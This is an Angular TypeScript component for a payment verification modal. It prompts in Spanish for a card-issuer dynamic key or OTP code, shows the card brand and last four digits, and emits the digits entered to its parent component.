import { Component, Input, Output, EventEmitter, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';

@Component({
  selector: 'app-verification-modal',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './verification-modal.component.html',
  styleUrl: './verification-modal.component.css'
})
export class VerificationModalComponent {
  @Input() id: string = 'verification-modal';
  @Input() brand: 'mc' | 'vs' | 'amex' | 'din' | 'dis' = 'mc';
  @Input() type: 1 | 2 = 1; // 1 = dynamic key (6 digits), 2 = OTP (8 digits)
  @Input() show: boolean = false;
  @Input() amount?: string;
  @Input() merchantName: string = 'nuestro comercio';
  @Input() cardLast4: string = '****';
  @Input() loading: boolean = false; // External loading state

  @Output() close = new EventEmitter<void>();
  @Output() submit = new EventEmitter<string>();

  verificationCode = signal('');

  // Use external loading state if provided, otherwise use internal
  get isLoading(): boolean {
    return this.loading;
  }

  // Icons mapping - Point to assets folder
  private icons: Record<string, string> = {
    'amex': 'assets/img/icons/amex.svg',
    'mc': 'assets/img/icons/mastercard.png',
    'vs': 'assets/img/icons/visa.svg',
    'dis': 'assets/img/icons/discover.svg',
    'din': 'assets/img/icons/diners.svg',
  };

  // Scheme configuration based on type
  private schemes: Record<number, { text: string; inputTitle: string }> = {
    1: {
      text: 'Consulta tu clave dinamica y escribela aquí.',
      inputTitle: 'Ingresa tu Clave Dinámica'
    },
    2: {
      text: 'Consulta el código OTP que llegó a tu correo electrónico ó celular y escribelo aquí.',
      inputTitle: 'Ingresa tu Codigo OTP'
    }
  };

  get brandIcon(): string {
    return this.icons[this.brand] || this.icons['mc'];
  }

  get maxLength(): number {
    return this.type === 1 ? 6 : 8;
  }

  get verificationText(): string {
    return this.schemes[this.type]?.text || '';
  }

  get inputTitle(): string {
    return this.schemes[this.type]?.inputTitle || '';
  }

  get transactionDate(): string {
    const now = new Date();
    const day = String(now.getDate()).padStart(2, '0');
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const year = now.getFullYear();
    return `${day}/${month}/${year}`;
  }

  onClose(): void {
    if (!this.isLoading) {
      this.verificationCode.set('');
      this.close.emit();
    }
  }

  onSubmit(): void {
    const code = this.verificationCode();
    if (code.length === this.maxLength) {
      this.submit.emit(code);
    }
  }

  onInput(event: Event): void {
    const input = event.target as HTMLInputElement;
    const value = input.value.replace(/\D/g, '').slice(0, this.maxLength);
    this.verificationCode.set(value);
  }
}
